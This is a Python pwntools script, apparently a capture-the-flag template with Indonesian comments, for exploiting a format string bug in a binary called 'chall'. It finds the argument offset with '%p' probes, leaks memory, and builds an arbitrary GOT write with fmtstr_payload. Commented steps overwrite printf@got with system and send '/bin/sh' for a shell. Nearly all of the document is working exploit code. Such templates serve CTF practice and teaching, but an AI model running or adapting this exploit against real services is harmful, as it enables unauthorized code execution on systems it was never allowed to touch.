#!/usr/bin/env python3
# Format string: (1) cari offset arg, (2) leak, (3) arbitrary write ke GOT.
# Isi BIN/HOST/PORT/PROMPT. Jalanin tahap demi tahap.
from pwn import *

BIN = './chall'
context.binary = exe = ELF(BIN, checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
HOST, PORT = 'host', 1337
PROMPT = b'> '

def start():
    return remote(HOST, PORT) if args.REMOTE else process(BIN)

# ---------- TAHAP 1: cari offset argumen kita ----------
# Jalanin sekali buat nemu slot yang nampilin 0x4141414141414141 / 0x...4141
def find_offset():
    for i in range(1, 30):
        io = process(BIN)
        io.sendlineafter(PROMPT, f'AAAAAAAA.%{i}$p'.encode())
        out = io.recvline().strip()
        io.close()
        log.info(f'{i}: {out}')
        if b'0x4141414141414141' in out or b'0x41414141' in out:
            log.success(f'offset = {i}')
            return i
    return None

# ---------- TAHAP 2: leak (contoh: bocorin libc / stack) ----------
def leak(off):
    io = start()
    io.sendlineafter(PROMPT, f'%{off}$p'.encode())
    return int(io.recvline().strip(), 16)

# ---------- TAHAP 3: arbitrary write ke GOT (otomatis pwntools) ----------
def write_got(off, target_addr, value):
    io = start()
    payload = fmtstr_payload(off, {target_addr: value})   # offset = slot arg kita
    io.sendlineafter(PROMPT, payload)
    return io

if __name__ == '__main__':
    OFFSET = find_offset()        # <- catat hasilnya, hardcode di run berikutnya
    # contoh: overwrite printf@got -> system, lalu kirim "/bin/sh"
    # io = write_got(OFFSET, exe.got['printf'], libc.sym['system'])
    # io.sendline(b'/bin/sh'); io.interactive()
